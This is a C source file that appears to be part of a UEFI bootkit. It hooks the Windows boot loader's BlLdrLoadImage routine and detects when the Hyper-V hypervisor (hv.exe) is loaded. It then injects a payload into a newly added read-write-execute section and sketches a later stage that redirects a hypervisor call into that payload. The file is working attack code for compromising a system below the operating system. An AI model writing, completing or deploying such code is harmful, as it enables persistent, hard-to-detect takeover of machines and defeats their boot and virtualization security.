#include "Compiler.h"
#include "ExtendedHv.h"
#include "WinDefines.h"
#include "Payload.h"

// Imports
extern VOID EFIAPI SerialPrint(IN CONST CHAR8 *format, ...);
extern VOID EFIAPI SerialPrintHex(IN CONST CHAR8 *label, IN UINT64 value);
extern EFI_STATUS InstallPatch(volatile patchinfo_t *info, void *originalFunction, void *targetFunction);
extern UINT64 PeAddSection(IN UINT64 imageBase, IN CONST CHAR8* sectionName, IN UINT32 virtualSize, IN UINT32 characteristics);
extern UINT64 FindPatternImage(IN VOID* imageBase, IN CONST CHAR8* pattern);

// Public Globals
BOOLEAN gBlLdrLoadImageReached = FALSE;

// Public Functions
EFI_STATUS InstallPatch_BlLdrLoadImage(IN VOID *originalFunction);

// Private Globals
static volatile patchinfo_t gBlLdrLoadImagePatchInfo;
static BOOLEAN gHvPatchedSuccessfully = FALSE;

// Private Functions
static EFI_STATUS EFIAPI PatchedBlLdrLoadImage(
  VOID* arg1, VOID* arg2, VOID* arg3, VOID* arg4, VOID* arg5, VOID* arg6, VOID* arg7,
  VOID* arg8, VOID* arg9, VOID* arg10, VOID* arg11, VOID* arg12, VOID* arg13,
  VOID* arg14,  VOID* arg15, VOID* arg16, VOID* arg17
);
static VOID ProcessHvImage(IN UINT64 imageBase, IN UINT64 imageSize);

// Implementation

EFI_STATUS InstallPatch_BlLdrLoadImage(IN VOID *originalFunction) {
  EFI_STATUS status;
  
  SerialPrint("[*] Installing BlLdrLoadImage patch\n");
  SerialPrintHex("  Target", (UINT64)originalFunction);
  
  status = InstallPatch(&gBlLdrLoadImagePatchInfo, originalFunction, PatchedBlLdrLoadImage);
  
  if (EFI_ERROR(status)) {
    SerialPrint("[!] InstallPatch failed: %r\n", status);
  } else {
    SerialPrint("[+] BlLdrLoadImage patch installed\n");
  }
  
  return status;
}

static EFI_STATUS EFIAPI PatchedBlLdrLoadImage(
  VOID* arg1, VOID* arg2, VOID *arg3, VOID *arg4, VOID* arg5, VOID* arg6, VOID* arg7,
  VOID* arg8, VOID* arg9, VOID* arg10, VOID* arg11, VOID* arg12, VOID* arg13,
  VOID* arg14,  VOID* arg15, VOID* arg16, VOID* arg17
) {
  //
  // Call the original function via trampoline
  // 
  const EFI_STATUS status =
    (
      (EFI_STATUS (EFIAPI *)(VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*, VOID*))
      gBlLdrLoadImagePatchInfo.trampoline
    )
    (arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17)
  ;

  //
  // Check the function completed properly
  // 
  if (EFI_ERROR(status)) return status;

  //
  // Check if we have already patched the hypervisor
  // 
  if (gHvPatchedSuccessfully) {
    return status;
  }

  //
  // Get arguments
  // 
  CHAR16* imagePath = (CHAR16*)arg3;
  CHAR16* imageName = (CHAR16*)arg4;
  const PLDR_DATA_TABLE_ENTRY entry = *(PPLDR_DATA_TABLE_ENTRY)arg9;

  //
  // Validate pointers
  //
  if (!imagePath || !imageName || !entry) {
    return status;
  }

  //
  // Compare image name to filter for hypervisor
  // 
  if (StrCmp(imageName, L"hv.exe") != 0) {
    return status;
  }

  //
  // Set flag that we reached this point
  // 
  gBlLdrLoadImageReached = TRUE;

  SerialPrint("\n");
  SerialPrint("================================================\n");
  SerialPrint("  Hypervisor Image Detected\n");
  SerialPrint("================================================\n");
  SerialPrintHex("Image Base", entry->ModuleBase);
  SerialPrintHex("Original Size", entry->SizeOfImage);

  //
  // Process hv.exe - add our payload section
  //
  ProcessHvImage(entry->ModuleBase, entry->SizeOfImage);

  return status;
}

static VOID ProcessHvImage(IN UINT64 imageBase, IN UINT64 imageSize) {
  UINTN payloadSize;
  VOID* payloadBase;
  UINT64 newSectionAddr;
  
  //
  // Get payload information
  //
  payloadSize = GetPayloadSize();
  payloadBase = GetPayloadBase();
  
  SerialPrint("[*] Payload information:\n");
  SerialPrintHex("  Payload base", (UINT64)payloadBase);
  SerialPrintHex("  Payload size", (UINT64)payloadSize);
  
  if (payloadSize == 0 || payloadSize > 0x100000) {
    SerialPrint("[!] Invalid payload size, aborting\n");
    return;
  }
  
  //
  // Add new section to hv.exe
  //
  SerialPrint("[*] Adding .zczxyhc section to hv.exe\n");
  newSectionAddr = PeAddSection(imageBase, ".zczxyhc", (UINT32)payloadSize, SECTION_RWX);
  
  if (!newSectionAddr) {
    SerialPrint("[!] Failed to add section\n");
    return;
  }
  
  SerialPrintHex("New section at", newSectionAddr);
  
  //
  // Copy payload into new section
  //
  SerialPrint("[*] Copying payload to new section\n");
  CopyMem((VOID*)newSectionAddr, payloadBase, payloadSize);
  
  //
  // Flush instruction cache for the new code
  //
  FlushInstructionCache((VOID*)newSectionAddr, payloadSize);
  
  SerialPrint("[+] Payload successfully injected into hv.exe\n");
  
  //
  // TODO Stage 3: Find target function and redirect to payload
  // For now, we've successfully added the section and copied our code
  //
  
  /*
   * Future implementation (Stage 3):
   * 
   * UINT64 targetFunction = FindPatternImage((VOID*)imageBase, "E8 ? ? ? ? 48 89 04 24");
   * if (targetFunction) {
   *   // Patch the call instruction to redirect to our payload
   *   PatchCallInstruction(targetFunction, newSectionAddr);
   * }
   */
  
  gHvPatchedSuccessfully = TRUE;
}
